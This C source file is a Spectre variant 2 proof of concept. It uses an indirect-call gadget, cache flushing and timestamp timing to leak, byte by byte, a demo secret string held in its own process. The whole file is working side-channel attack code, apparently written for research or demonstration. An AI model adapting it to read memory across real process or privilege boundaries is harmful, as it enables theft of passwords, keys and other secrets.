#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h> /* for rdtscp and clflush */

#define CACHE_HIT_THRESHOLD (250)
#define GAP (1024)

// leave commented to use channel in heap, uncomment to use bss
// with old linux loaders (e.g. ubuntu 18.04), channel in bss will result in
// always hits, as if clflush/mfence didn't work
// #define CHANNEL_IN_BSS

#ifdef CHANNEL_IN_BSS
uint8_t channel[256 * GAP];  // side channel to extract secret phrase
#else
uint8_t *channel; // side channel to extract secret phrase
#endif
uint64_t *target; // pointer to indirect call target
char *secret = "The Magic Words are Squeamish Ossifrage.";

// mistrained target of indirect call
int gadget(char *addr) { return channel[*addr * GAP]; }

// safe target of indirect call
int safe_target() { return 42; }

// function that makes indirect call
// note that addr will be passed to gadget via %rdi
int victim(char *addr, int input) {
  for (int i = 1; i <= 29; i++) {}

  int result;
  // call *target
  __asm volatile("mov r11, %1\n"
                 "call qword ptr [r11]\n"
                 "mov %0, eax\n"
                 : "=r" (result)
                 : "r" (target)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
  return result;
}

// see appendix C of https://spectreattack.com/spectre.pdf
void readByte(char *addr_to_read, uint8_t result[2], uint32_t score[2])
{
  uint32_t hits[256]; // record number of cache hits
  int tries, i, j, k, mix_i, junk = 0;
  uint64_t start, elapsed;
  uint8_t *addr;

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 1;
  }

  *target = (uint64_t)&safe_target;
  _mm_mfence();

  for (tries = 50; tries > 0; tries--) {
    // flush side channel
    for (i = 0; i < 256; i++)
      _mm_clflush(&channel[i * GAP]);
    _mm_mfence();

    // flush target to prolong misprediction interval
    _mm_clflush((void*) target);
    _mm_mfence();

    // call victim
    junk ^= victim(addr_to_read, 0);
    _mm_mfence();

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = __rdtsc();
      junk ^= *addr;
      _mm_mfence(); // make sure read completes before we check the timer
      elapsed = __rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }

    // locate top two results
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || hits[i] >= hits[j]) {
        k = j;
        j = i;
      } else if (k < 0 || hits[i] >= hits[k]) {
        k = i;
      }
    }
    if ((hits[j] >= 2 * hits[k] + 5) ||
        (hits[j] == 2 && hits[k] == 0)) {
      break;
    }
  }

  hits[0] ^= junk; // prevent junk from being optimized out
  result[0] = (char)j;
  score[0] = hits[j];
  result[1] = (char)k;
  score[1] = hits[k];
}

int main(int argc, char *argv[]) {
  #ifndef CHANNEL_IN_BSS
  channel = (uint8_t*)malloc(256 * GAP); // side channel to extract secret phrase
  #endif
  target = (uint64_t*)malloc(sizeof(uint64_t));

  uint8_t result[2];
  uint32_t score[2];
  int len = strlen(secret);
  char *addr = secret;

  while (--len >= 0) {
    char *a = addr++;
    while (1) {
      readByte(a, result, score);
      if (score[0] == 0) continue;
      if (score[0] > 1) break;
      printf("reading %p... inconclusive ['%c' 0x%02x, '%c' 0x%02x] [0x%x 0x%x], retrying\n", a, (result[0] > 31 && result[0] < 127 ? result[0] : '?'), result[0], (result[1] > 31 && result[1] < 127 ? result[1] : '?'), result[1], score[0], score[1]);
    }
    printf("reading %p ", a);
    printf("%s: ", (score[0] >= 2 * score[1] ? "success" : "unclear"));
    printf("0x%02X='%c'\n", result[0], (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
  }
  printf("done - you may now ^C to stop the attacker\n");

  free(target);
  return 0;
}